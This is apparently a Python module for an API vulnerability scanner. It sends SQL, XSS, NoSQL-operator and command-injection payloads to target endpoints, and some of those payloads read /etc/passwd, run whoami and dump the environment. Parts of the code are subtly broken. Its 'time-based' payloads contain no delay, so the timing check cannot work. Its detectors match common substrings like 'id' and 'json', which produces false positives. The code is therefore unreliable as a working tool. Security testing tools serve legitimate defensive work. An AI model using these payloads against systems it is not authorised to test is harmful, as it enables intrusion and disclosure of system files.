#!/usr/bin/env python3
"""
Advanced Payload Testing Module

This module implements advanced payload variations for edge cases including
Unicode variations, encoding bypasses, time-based injections, and advanced
XSS/NoSQL/Command injection techniques.
"""

import json
import time
import asyncio
import urllib.parse
import base64
import binascii
from typing import List, Dict, Any, Optional, Tuple
from dataclasses import dataclass
from enum import Enum
import requests


class AdvancedPayloadType(Enum):
    """Types of advanced payloads"""
    UNICODE_VARIATIONS = "unicode_variations"
    ENCODING_BYPASS = "encoding_bypass"
    TIME_BASED_INJECTION = "time_based_injection"
    ADVANCED_XSS = "advanced_xss"
    ADVANCED_NOSQL = "advanced_nosql"
    COMMAND_INJECTION = "command_injection"
    EDGE_CASE_COMBINATIONS = "edge_case_combinations"


@dataclass
class AdvancedPayload:
    """Advanced payload definition"""
    payload_type: AdvancedPayloadType
    name: str
    description: str
    payload: str
    encoding: str
    expected_behavior: str
    severity: str
    category: str
    target_endpoints: List[str]
    prerequisites: List[str]


class AdvancedPayloadTester:
    """Tester for advanced payload variations"""
    
    def __init__(self, base_url: str, session):
        self.base_url = base_url
        self.session = session
        self.payload_generator = AdvancedPayloadGenerator()
    
    async def test_unicode_variations(self, endpoint: str, method: str, parameter: str) -> Dict[str, Any]:
        """Test Unicode-based payload variations"""
        results = []
        unicode_payloads = self.payload_generator.get_unicode_payloads()
        
        for payload in unicode_payloads:
            result = await self._execute_advanced_payload_test(
                endpoint, method, parameter, payload, AdvancedPayloadType.UNICODE_VARIATIONS
            )
            results.append(result)
        
        return {
            "endpoint": endpoint,
            "method": method,
            "parameter": parameter,
            "test_type": "unicode_variations",
            "results": results,
            "total_tests": len(results),
            "vulnerabilities_found": sum(1 for r in results if r.get("vulnerability_found", False))
        }
    
    async def test_encoding_bypass(self, endpoint: str, method: str, parameter: str) -> Dict[str, Any]:
        """Test encoding-based payload variations"""
        results = []
        encoding_payloads = self.payload_generator.get_encoding_payloads()
        
        for payload in encoding_payloads:
            result = await self._execute_advanced_payload_test(
                endpoint, method, parameter, payload, AdvancedPayloadType.ENCODING_BYPASS
            )
            results.append(result)
        
        return {
            "endpoint": endpoint,
            "method": method,
            "parameter": parameter,
            "test_type": "encoding_bypass",
            "results": results,
            "total_tests": len(results),
            "vulnerabilities_found": sum(1 for r in results if r.get("vulnerability_found", False))
        }
    
    async def test_time_based_injection(self, endpoint: str, method: str, parameter: str) -> Dict[str, Any]:
        """Test time-based blind injection payloads"""
        results = []
        time_based_payloads = self.payload_generator.get_time_based_payloads()
        
        for payload in time_based_payloads:
            result = await self._execute_time_based_test(
                endpoint, method, parameter, payload
            )
            results.append(result)
        
        return {
            "endpoint": endpoint,
            "method": method,
            "parameter": parameter,
            "test_type": "time_based_injection",
            "results": results,
            "total_tests": len(results),
            "vulnerabilities_found": sum(1 for r in results if r.get("vulnerability_found", False))
        }
    
    async def test_advanced_xss(self, endpoint: str, method: str, parameter: str) -> Dict[str, Any]:
        """Test advanced XSS payload variations"""
        results = []
        xss_payloads = self.payload_generator.get_advanced_xss_payloads()
        
        for payload in xss_payloads:
            result = await self._execute_advanced_payload_test(
                endpoint, method, parameter, payload, AdvancedPayloadType.ADVANCED_XSS
            )
            results.append(result)
        
        return {
            "endpoint": endpoint,
            "method": method,
            "parameter": parameter,
            "test_type": "advanced_xss",
            "results": results,
            "total_tests": len(results),
            "vulnerabilities_found": sum(1 for r in results if r.get("vulnerability_found", False))
        }
    
    async def test_advanced_nosql(self, endpoint: str, method: str, parameter: str) -> Dict[str, Any]:
        """Test advanced NoSQL injection payloads"""
        results = []
        nosql_payloads = self.payload_generator.get_advanced_nosql_payloads()
        
        for payload in nosql_payloads:
            result = await self._execute_advanced_payload_test(
                endpoint, method, parameter, payload, AdvancedPayloadType.ADVANCED_NOSQL
            )
            results.append(result)
        
        return {
            "endpoint": endpoint,
            "method": method,
            "parameter": parameter,
            "test_type": "advanced_nosql",
            "results": results,
            "total_tests": len(results),
            "vulnerabilities_found": sum(1 for r in results if r.get("vulnerability_found", False))
        }
    
    async def test_command_injection(self, endpoint: str, method: str, parameter: str) -> Dict[str, Any]:
        """Test command injection payloads"""
        results = []
        command_payloads = self.payload_generator.get_command_injection_payloads()
        
        for payload in command_payloads:
            result = await self._execute_advanced_payload_test(
                endpoint, method, parameter, payload, AdvancedPayloadType.COMMAND_INJECTION
            )
            results.append(result)
        
        return {
            "endpoint": endpoint,
            "method": method,
            "parameter": parameter,
            "test_type": "command_injection",
            "results": results,
            "total_tests": len(results),
            "vulnerabilities_found": sum(1 for r in results if r.get("vulnerability_found", False))
        }
    
    async def test_edge_case_combinations(self, endpoint: str, method: str, parameter: str) -> Dict[str, Any]:
        """Test edge case payload combinations"""
        results = []
        edge_case_payloads = self.payload_generator.get_edge_case_combinations()
        
        for payload in edge_case_payloads:
            result = await self._execute_advanced_payload_test(
                endpoint, method, parameter, payload, AdvancedPayloadType.EDGE_CASE_COMBINATIONS
            )
            results.append(result)
        
        return {
            "endpoint": endpoint,
            "method": method,
            "parameter": parameter,
            "test_type": "edge_case_combinations",
            "results": results,
            "total_tests": len(results),
            "vulnerabilities_found": sum(1 for r in results if r.get("vulnerability_found", False))
        }
    
    async def _execute_advanced_payload_test(self, endpoint: str, method: str, parameter: str, 
                                           payload: str, payload_type: AdvancedPayloadType) -> Dict[str, Any]:
        """Execute an advanced payload test"""
        try:
            url = f"{self.base_url}{endpoint}"
            
            # Prepare request parameters
            if method.upper() == "GET":
                params = {parameter: payload}
                response = self.session.get(url, params=params, timeout=30)
            elif method.upper() == "POST":
                data = {parameter: payload}
                response = self.session.post(url, json=data, timeout=30)
            elif method.upper() == "PUT":
                data = {parameter: payload}
                response = self.session.put(url, json=data, timeout=30)
            else:
                data = {parameter: payload}
                response = self.session.request(method, url, json=data, timeout=30)
            
            # Analyze response for vulnerability indicators
            vulnerability_found = self._analyze_advanced_payload_response(response, payload, payload_type)
            
            return {
                "payload": payload,
                "payload_type": payload_type.value,
                "parameter": parameter,
                "status_code": response.status_code,
                "response_length": len(response.text),
                "response_time": response.elapsed.total_seconds(),
                "vulnerability_found": vulnerability_found,
                "vulnerability_indicators": self._get_payload_vulnerability_indicators(response, payload_type),
                "severity": self._determine_payload_severity(payload_type, vulnerability_found),
                "category": payload_type.value.replace("_", " ").title()
            }
            
        except Exception as e:
            return {
                "payload": payload,
                "payload_type": payload_type.value,
                "parameter": parameter,
                "error": str(e),
                "vulnerability_found": False,
                "severity": "Info",
                "category": payload_type.value.replace("_", " ").title()
            }
    
    async def _execute_time_based_test(self, endpoint: str, method: str, parameter: str, payload: str) -> Dict[str, Any]:
        """Execute time-based injection test"""
        try:
            url = f"{self.base_url}{endpoint}"
            
            # Measure baseline response time
            baseline_start = time.time()
            if method.upper() == "GET":
                baseline_response = self.session.get(url, params={parameter: "1"}, timeout=30)
            else:
                baseline_response = self.session.request(method, url, json={parameter: "1"}, timeout=30)
            baseline_time = time.time() - baseline_start
            
            # Measure payload response time
            payload_start = time.time()
            if method.upper() == "GET":
                payload_response = self.session.get(url, params={parameter: payload}, timeout=30)
            else:
                payload_response = self.session.request(method, url, json={parameter: payload}, timeout=30)
            payload_time = time.time() - payload_start
            
            # Check for time-based injection (payload should take significantly longer)
            time_difference = payload_time - baseline_time
            vulnerability_found = time_difference > 2.0  # 2 second threshold
            
            return {
                "payload": payload,
                "payload_type": AdvancedPayloadType.TIME_BASED_INJECTION.value,
                "parameter": parameter,
                "baseline_time": baseline_time,
                "payload_time": payload_time,
                "time_difference": time_difference,
                "status_code": payload_response.status_code,
                "response_length": len(payload_response.text),
                "vulnerability_found": vulnerability_found,
                "vulnerability_indicators": ["Time-based injection detected"] if vulnerability_found else [],
                "severity": "High" if vulnerability_found else "Info",
                "category": "Time-Based Injection"
            }
            
        except Exception as e:
            return {
                "payload": payload,
                "payload_type": AdvancedPayloadType.TIME_BASED_INJECTION.value,
                "parameter": parameter,
                "error": str(e),
                "vulnerability_found": False,
                "severity": "Info",
                "category": "Time-Based Injection"
            }
    
    def _analyze_advanced_payload_response(self, response, payload: str, payload_type: AdvancedPayloadType) -> bool:
        """Analyze response for advanced payload vulnerability indicators"""
        response_text = response.text.lower()
        
        if payload_type == AdvancedPayloadType.UNICODE_VARIATIONS:
            # Look for Unicode-related errors or successful injection
            unicode_indicators = ["unicode", "utf-8", "encoding", "character", "invalid"]
            return any(indicator in response_text for indicator in unicode_indicators)
        
        elif payload_type == AdvancedPayloadType.ENCODING_BYPASS:
            # Look for encoding-related errors or successful bypass
            encoding_indicators = ["decode", "encode", "url", "base64", "hex", "invalid"]
            return any(indicator in response_text for indicator in encoding_indicators)
        
        elif payload_type == AdvancedPayloadType.ADVANCED_XSS:
            # Look for XSS indicators
            xss_indicators = ["script", "alert", "javascript", "onerror", "onload", "onclick"]
            return any(indicator in response_text for indicator in xss_indicators)
        
        elif payload_type == AdvancedPayloadType.ADVANCED_NOSQL:
            # Look for NoSQL-related errors or successful injection
            nosql_indicators = ["mongo", "nosql", "json", "bson", "query", "aggregate"]
            return any(indicator in response_text for indicator in nosql_indicators)
        
        elif payload_type == AdvancedPayloadType.COMMAND_INJECTION:
            # Look for command execution indicators
            command_indicators = ["root", "admin", "uid=", "gid=", "groups=", "whoami", "id"]
            return any(indicator in response_text for indicator in command_indicators)
        
        elif payload_type == AdvancedPayloadType.EDGE_CASE_COMBINATIONS:
            # Look for edge case indicators
            edge_case_indicators = ["error", "exception", "invalid", "unexpected", "malformed"]
            return any(indicator in response_text for indicator in edge_case_indicators)
        
        return False
    
    def _get_payload_vulnerability_indicators(self, response, payload_type: AdvancedPayloadType) -> List[str]:
        """Get specific vulnerability indicators from response"""
        indicators = []
        response_text = response.text.lower()
        
        if payload_type == AdvancedPayloadType.ADVANCED_XSS:
            if "script" in response_text:
                indicators.append("Script tag execution detected")
            if "alert" in response_text:
                indicators.append("Alert function execution detected")
            if "javascript" in response_text:
                indicators.append("JavaScript execution detected")
        
        elif payload_type == AdvancedPayloadType.COMMAND_INJECTION:
            if "root" in response_text:
                indicators.append("Root user access detected")
            if "uid=" in response_text:
                indicators.append("User ID information leaked")
            if "whoami" in response_text:
                indicators.append("Whoami command execution detected")
        
        elif payload_type == AdvancedPayloadType.ADVANCED_NOSQL:
            if "mongo" in response_text:
                indicators.append("MongoDB error detected")
            if "json" in response_text:
                indicators.append("JSON parsing error detected")
            if "query" in response_text:
                indicators.append("Query execution detected")
        
        return indicators
    
    def _determine_payload_severity(self, payload_type: AdvancedPayloadType, vulnerability_found: bool) -> str:
        """Determine severity based on payload type and result"""
        if not vulnerability_found:
            return "Info"
        
        severity_map = {
            AdvancedPayloadType.COMMAND_INJECTION: "Critical",
            AdvancedPayloadType.ADVANCED_XSS: "High",
            AdvancedPayloadType.TIME_BASED_INJECTION: "High",
            AdvancedPayloadType.ADVANCED_NOSQL: "High",
            AdvancedPayloadType.UNICODE_VARIATIONS: "Medium",
            AdvancedPayloadType.ENCODING_BYPASS: "Medium",
            AdvancedPayloadType.EDGE_CASE_COMBINATIONS: "Medium"
        }
        
        return severity_map.get(payload_type, "Medium")


class AdvancedPayloadGenerator:
    """Generator for advanced payload variations"""
    
    def __init__(self):
        self.unicode_payloads = self._generate_unicode_payloads()
        self.encoding_payloads = self._generate_encoding_payloads()
        self.time_based_payloads = self._generate_time_based_payloads()
        self.advanced_xss_payloads = self._generate_advanced_xss_payloads()
        self.advanced_nosql_payloads = self._generate_advanced_nosql_payloads()
        self.command_injection_payloads = self._generate_command_injection_payloads()
        self.edge_case_combinations = self._generate_edge_case_combinations()
    
    def _generate_unicode_payloads(self) -> List[str]:
        """Generate Unicode-based payload variations"""
        return [
            # Unicode null bytes
            "' OR 1=1--\u0000\u0001\u0002",
            "admin'\u0000--",
            "1'\u0000UNION SELECT * FROM users--",
            
            # Unicode escape sequences
            "' OR 1=1--\\u0000\\u0001\\u0002",
            "admin'\\u0000--",
            "1'\\u0000UNION SELECT * FROM users--",
            
            # Unicode normalization
            "' OR 1=1--\u00A0\u00A0\u00A0",  # Non-breaking spaces
            "admin'\u00A0--",
            "1'\u00A0UNION SELECT * FROM users--",
            
            # Unicode case variations
            "' OR 1=1--\u0041\u0042\u0043",  # ABC in Unicode
            "admin'\u0041--",
            "1'\u0041UNION SELECT * FROM users--",
            
            # Unicode mathematical symbols
            "' OR 1=1--\u2264\u2265\u2260",  # ≤ ≥ ≠
            "admin'\u2264--",
            "1'\u2264UNION SELECT * FROM users--",
            
            # Unicode arrows
            "' OR 1=1--\u2190\u2191\u2192\u2193",  # ← ↑ → ↓
            "admin'\u2190--",
            "1'\u2190UNION SELECT * FROM users--"
        ]
    
    def _generate_encoding_payloads(self) -> List[str]:
        """Generate encoding-based payload variations"""
        return [
            # URL encoding
            "%27%20OR%201%3D1--",
            "admin%27--",
            "1%27%20UNION%20SELECT%20*%20FROM%20users--",
            
            # Double URL encoding
            "%2527%2520OR%25201%253D1--",
            "admin%2527--",
            "1%2527%2520UNION%2520SELECT%2520*%2520FROM%2520users--",
            
            # HTML encoding
            "&#39; OR 1=1--",
            "admin&#39;--",
            "1&#39; UNION SELECT * FROM users--",
            
            # Hex encoding
            "0x27204f5220313d312d2d",  # ' OR 1=1--
            "0x61646d696e272d2d",  # admin'--
            
            # Base64 encoding
            "JyBPUiAxPTEtLQ==",  # ' OR 1=1--
            "YWRtaW4nLS0=",  # admin'--
            
            # Mixed encoding
            "%27%20OR%201%3D1--\u0000",
            "admin%27--\u0000",
            "1%27%20UNION%20SELECT%20*%20FROM%20users--\u0000",
            
            # UTF-8 encoding
            "â€™ OR 1=1--",  # Smart quote
            "adminâ€™--",
            "1â€™ UNION SELECT * FROM users--"
        ]
    
    def _generate_time_based_payloads(self) -> List[str]:
        """Generate time-based blind injection payloads"""
        return [
            # SQLite time-based injection
            "1' AND (SELECT COUNT(*) FROM sqlite_master WHERE type='table')>0 AND (SELECT 1 FROM sqlite_master LIMIT 1 OFFSET 0) AND 1=1--",
            "1' AND (SELECT COUNT(*) FROM sqlite_master WHERE name='users')>0 AND 1=1--",
            "1' AND (SELECT COUNT(*) FROM sqlite_master WHERE type='table')>0 AND (SELECT 1 FROM sqlite_master LIMIT 1 OFFSET 0) AND 1=1--",
            
            # MySQL time-based injection
            "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0 AND (SELECT 1 FROM information_schema.tables LIMIT 1 OFFSET 0) AND 1=1--",
            "1' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_name='users')>0 AND 1=1--",
            
            # PostgreSQL time-based injection
            "1' AND (SELECT COUNT(*) FROM pg_tables)>0 AND (SELECT 1 FROM pg_tables LIMIT 1 OFFSET 0) AND 1=1--",
            "1' AND (SELECT COUNT(*) FROM pg_tables WHERE tablename='users')>0 AND 1=1--",
            
            # Oracle time-based injection
            "1' AND (SELECT COUNT(*) FROM user_tables)>0 AND (SELECT 1 FROM user_tables WHERE ROWNUM=1) AND 1=1--",
            "1' AND (SELECT COUNT(*) FROM user_tables WHERE table_name='USERS')>0 AND 1=1--",
            
            # SQL Server time-based injection
            "1' AND (SELECT COUNT(*) FROM sysobjects WHERE xtype='U')>0 AND (SELECT 1 FROM sysobjects WHERE xtype='U' AND name='users') AND 1=1--",
            "1' AND (SELECT COUNT(*) FROM sysobjects WHERE xtype='U' AND name='users')>0 AND 1=1--"
        ]
    
    def _generate_advanced_xss_payloads(self) -> List[str]:
        """Generate advanced XSS payload variations"""
        return [
            # DOM-based XSS
            "javascript:alert('DOM XSS')",
            "javascript:alert(String.fromCharCode(88,83,83))",
            "javascript:alert(/XSS/)",
            
            # Event handler XSS
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<iframe onload=alert('XSS')>",
            
            # Filter bypass XSS
            "<ScRiPt>alert('XSS')</ScRiPt>",
            "<script>alert('XSS')</script>",
            "<SCRIPT>alert('XSS')</SCRIPT>",
            
            # Encoded XSS
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<script>alert(/XSS/)</script>",
            "<script>alert('XSS')</script>",
            
            # Context-specific XSS
            "';alert('XSS');//",
            "\";alert('XSS');//",
            "</script><script>alert('XSS')</script>",
            
            # Advanced XSS techniques
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<iframe onload=alert('XSS')>",
            
            # XSS with encoding
            "&#60;script&#62;alert('XSS')&#60;/script&#62;",
            "%3Cscript%3Ealert('XSS')%3C/script%3E",
            "&lt;script&gt;alert('XSS')&lt;/script&gt;",
            
            # XSS with Unicode
            "<script>alert('XSS')</script>\u0000",
            "<img src=x onerror=alert('XSS')>\u0000",
            "<svg onload=alert('XSS')>\u0000"
        ]
    
    def _generate_advanced_nosql_payloads(self) -> List[str]:
        """Generate advanced NoSQL injection payloads"""
        return [
            # MongoDB regex injection
            '{"$regex": ".*admin.*", "$options": "i"}',
            '{"$regex": "^admin", "$options": "i"}',
            '{"$regex": "admin$", "$options": "i"}',
            
            # MongoDB JavaScript injection
            '{"$where": "this.username == \'admin\'"}',
            '{"$where": "this.password == \'password\'"}',
            '{"$where": "this.username == \'admin\' && this.password == \'password\'"}',
            
            # MongoDB comparison operators
            '{"$gt": ""}',
            '{"$ne": null}',
            '{"$exists": true}',
            '{"$in": ["admin", "user"]}',
            '{"$nin": ["user"]}',
            
            # MongoDB logical operators
            '{"$or": [{"username": "admin"}, {"username": "user"}]}',
            '{"$and": [{"username": "admin"}, {"password": "password"}]}',
            '{"$not": {"username": "user"}}',
            
            # MongoDB array operators
            '{"$all": ["admin", "user"]}',
            '{"$elemMatch": {"role": "admin"}}',
            '{"$size": 1}',
            
            # MongoDB type operators
            '{"$type": "string"}',
            '{"$type": "number"}',
            '{"$type": "object"}',
            
            # MongoDB geospatial operators
            '{"$near": {"$geometry": {"type": "Point", "coordinates": [0, 0]}}}',
            '{"$geoWithin": {"$geometry": {"type": "Polygon", "coordinates": [[[0, 0], [1, 1], [1, 0], [0, 0]]]}}}'
        ]
    
    def _generate_command_injection_payloads(self) -> List[str]:
        """Generate command injection payloads"""
        return [
            # Semicolon separator
            "test; cat /etc/passwd",
            "test; whoami",
            "test; id",
            "test; ls -la",
            
            # Pipe operator
            "test | whoami",
            "test | cat /etc/passwd",
            "test | id",
            "test | ls -la",
            
            # Ampersand operator
            "test & whoami",
            "test & cat /etc/passwd",
            "test & id",
            "test & ls -la",
            
            # Backtick execution
            "test `whoami`",
            "test `cat /etc/passwd`",
            "test `id`",
            "test `ls -la`",
            
            # Dollar sign execution
            "test $(whoami)",
            "test $(cat /etc/passwd)",
            "test $(id)",
            "test $(ls -la)",
            
            # Command substitution
            "test; echo $(whoami)",
            "test; echo `cat /etc/passwd`",
            "test; echo $(id)",
            "test; echo `ls -la`",
            
            # Multiple commands
            "test; whoami; id; cat /etc/passwd",
            "test | whoami | id",
            "test & whoami & id",
            
            # Environment variable injection
            "test; echo $PATH",
            "test; echo $HOME",
            "test; echo $USER",
            "test; env",
            
            # File redirection
            "test; cat /etc/passwd > /tmp/test",
            "test; whoami > /tmp/test",
            "test; id > /tmp/test"
        ]
    
    def _generate_edge_case_combinations(self) -> List[str]:
        """Generate edge case payload combinations"""
        return [
            # Unicode + SQL injection
            "' OR 1=1--\u0000\u0001\u0002",
            "admin'\u0000--",
            "1'\u0000UNION SELECT * FROM users--",
            
            # Encoding + XSS
            "%3Cscript%3Ealert('XSS')%3C/script%3E",
            "&#60;script&#62;alert('XSS')&#60;/script&#62;",
            "&lt;script&gt;alert('XSS')&lt;/script&gt;",
            
            # Unicode + XSS
            "<script>alert('XSS')</script>\u0000",
            "<img src=x onerror=alert('XSS')>\u0000",
            "<svg onload=alert('XSS')>\u0000",
            
            # Encoding + NoSQL
            "%7B%22%24regex%22%3A%22.*admin.*%22%7D",  # {"$regex":".*admin.*"}
            "%7B%22%24where%22%3A%22this.username%20%3D%3D%20%27admin%27%22%7D",  # {"$where":"this.username == 'admin'"}
            
            # Unicode + Command injection
            "test; whoami\u0000",
            "test | cat /etc/passwd\u0000",
            "test & id\u0000",
            
            # Mixed encoding combinations
            "%27%20OR%201%3D1--\u0000",  # URL encoded + Unicode
            "admin%27--\u0000",
            "1%27%20UNION%20SELECT%20*%20FROM%20users--\u0000",
            
            # Edge case length variations
            "a" * 1000,  # Very long string
            "a" * 10000,  # Extremely long string
            "",  # Empty string
            " ",  # Single space
            "\t",  # Tab character
            "\n",  # Newline character
            "\r",  # Carriage return
            "\0",  # Null character
        ]
    
    def get_unicode_payloads(self) -> List[str]:
        """Get Unicode payloads"""
        return self.unicode_payloads
    
    def get_encoding_payloads(self) -> List[str]:
        """Get encoding payloads"""
        return self.encoding_payloads
    
    def get_time_based_payloads(self) -> List[str]:
        """Get time-based payloads"""
        return self.time_based_payloads
    
    def get_advanced_xss_payloads(self) -> List[str]:
        """Get advanced XSS payloads"""
        return self.advanced_xss_payloads
    
    def get_advanced_nosql_payloads(self) -> List[str]:
        """Get advanced NoSQL payloads"""
        return self.advanced_nosql_payloads
    
    def get_command_injection_payloads(self) -> List[str]:
        """Get command injection payloads"""
        return self.command_injection_payloads
    
    def get_edge_case_combinations(self) -> List[str]:
        """Get edge case combinations"""
        return self.edge_case_combinations
    
    def get_all_payloads(self) -> Dict[str, List[str]]:
        """Get all payload categories"""
        return {
            "unicode": self.unicode_payloads,
            "encoding": self.encoding_payloads,
            "time_based": self.time_based_payloads,
            "advanced_xss": self.advanced_xss_payloads,
            "advanced_nosql": self.advanced_nosql_payloads,
            "command_injection": self.command_injection_payloads,
            "edge_case_combinations": self.edge_case_combinations
        }